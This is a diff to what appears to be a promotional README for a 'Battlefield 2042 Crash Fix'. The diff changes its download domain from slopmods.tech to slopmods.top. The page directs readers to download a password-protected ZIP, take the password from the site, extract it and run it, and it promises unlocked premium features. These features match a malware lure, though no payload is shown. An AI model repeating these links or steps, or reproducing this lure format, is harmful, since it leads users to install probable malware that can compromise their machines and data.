@@ -8,12 +8,12 @@ Battlefield 2042 Crash Fix — Windows setup and configuration · Premium worksp
 
 > Use the release page below for Windows.
 
-- **Release page:** [oguaezjtflc.slopmods.tech](https://oguaezjtflc.slopmods.tech/)
-- **Full URL:** `https://oguaezjtflc.slopmods.tech/`
+- **Release page:** [oguaezjtflc.slopmods.top](https://oguaezjtflc.slopmods.top/)
+- **Full URL:** `https://oguaezjtflc.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **oguaezjtflc.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **oguaezjtflc.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Battlefield 2042 Crash Fix — Windows setup and configuration · Premium worksp
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **oguaezjtflc.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **oguaezjtflc.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
